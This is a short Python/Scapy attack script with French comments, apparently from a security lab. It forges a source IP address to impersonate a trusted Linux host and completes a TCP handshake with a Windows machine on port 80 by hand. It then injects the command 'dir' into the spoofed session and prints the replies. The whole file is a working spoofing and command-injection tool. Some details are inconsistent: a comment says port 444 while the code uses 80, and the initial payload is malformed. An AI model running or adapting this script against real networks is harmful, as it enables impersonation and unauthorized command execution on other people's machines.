from  scapy.all import *
import socket
import random



def receive(packet):
	global sport
	if packet.haslayer(TCP) and packet[TCP].sport == 80: #Windows machine answered
		if packet[TCP].flags == "SA": # si le packet est un SYN/ACK, venant de Windows 
			createpacket("A",packet[TCP].ack,packet[TCP].seq+1,sport,80,"") #on cree un paquet ACK, en incrementant le numero de sequence
			#Puis on l'envoie a Windows
		if packet[TCP].flags == "PA": # si le paquet est un push/ack 
			data = packet[TCP].payload #lire la donnee
			if len(data)==114:
				createpacket("PA",packet[TCP].ack,packet[TCP].seq+len(data),sport,80,"dir\n") #creer un paquet pour envoyer une commande
			else:
				createpacket("A",packet[TCP].ack,packet[TCP].seq+len(data),sport,80,"") #creer un paquet ACK sans payload (vide)
		
			print (data) #afficher le resultat
			
	

def createpacket(flags,seq,ack,sport,dport,payload):
	eth = Ether()
	eth.src = "08:00:27:b1:5c:eb" #Mac Kali
	eth.dst = "08:00:27:d0:7c:89" #MAC Windows
	ip = IP()
	ip.src = "192.168.50.2" #Kali as Linux <=== spoofing
	ip.dst = "192.168.50.20" #Windows
	tcp = TCP()
	tcp.flags = flags
	tcp.dport = dport
	tcp.seq = seq
	tcp.sport = sport
	tcp.ack=ack
	packet = eth/ip/tcp/payload
	s.send(str(packet))
	

#creer un scoket agnostique par rapport au protocol TCP ou UDP
s= socket.socket(socket.AF_PACKET,socket.SOCK_RAW)

# generer arbitrairement un numero de sequence et port source 
#dans la machine attaquant KALI
myseq = random.randint(120,2345)
sport = random.randint(120,2345)

#associer l'interface avec port physique
s.bind(("eth0",0))

#Creer un Pacquet SYN avec un FLAG TCP S, ACK = 0,
#le port source arbitraire et le port 444 au niveau de WINDOWS
createpacket("S",myseq,0,sport,80,"HTTP/1.1 GET / HTTP/1.1\n\n")

http_get_payload = "GET / HTTP/1.1\n\n"

#On sniffe sur l'interace en appellant la fonction "receive"
#a chaque reception d'un paquet pour traiter et maintenir la session TCP
sniff(iface="eth0",prn=receive)

